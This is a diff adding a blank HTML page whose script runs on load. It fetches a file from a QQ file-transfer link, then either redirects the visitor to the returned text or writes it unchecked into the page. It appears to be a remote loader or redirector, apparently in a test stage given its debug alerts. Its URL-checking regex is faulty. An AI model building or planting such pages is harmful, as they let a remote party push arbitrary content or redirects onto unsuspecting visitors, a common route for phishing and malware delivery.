@@ -1,0 +1,51 @@
+<HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312"/>
+<head>
+<script type="text/javascript">
+function check(url){ 
+ var strRegex = "^((https|http|ftp|rtsp|mms)://)?[a-z0-9A-Z]{3}\.[a-z0-9A-Z][a-z0-9A-Z]{0,61}?[a-z0-9A-Z]\.com|net|cn|cc (:s[0-9]{1-4})?/$";
+            var re = new RegExp(strRegex);
+            if (re.test(url)) {
+                //alert("成功");
+                return true;
+            } else {
+                //alert("失败");
+                 return false;
+            }
+} 
+
+function loadXMLDoc()
+{
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {// code for IE7+, Firefox, Chrome, Opera, Safari
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {// code for IE6, IE5
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+		alert(xmlhttp.responseText);
+		if(check(xmlhttp.responseText))
+		{
+		     window.location.replace(xmlhttp.responseText);
+		}else
+		{
+			document.write(xmlhttp.responseText);
+		}
+    }
+  }
+xmlhttp.open("GET","http://tj.yun.ftn.qq.com/ftn_handler/d04065856f8d48b0c15695a4db55f2ea7b7f2c1614db1519aa09a06a5e3e22ed/?fname=test1.html&cn=0&cv=30111",true);
+//xmlhttp.open("GET","http://tj.yun.ftn.qq.com/ftn_handler/6a1a532c872cfdc28ebfa6b5144b7c58863682f50306017dfa7a9494b0200015/?fname=test.html&cn=0&cv=30111",true);
+xmlhttp.send();
+}
+</script>
+</head>
+<BODY marginheight="0" leftmargin="0" rightmargin="0" topmargin="0" bottommargin="0" onLoad="loadXMLDoc()">
+
+</BODY>
+</HTML>
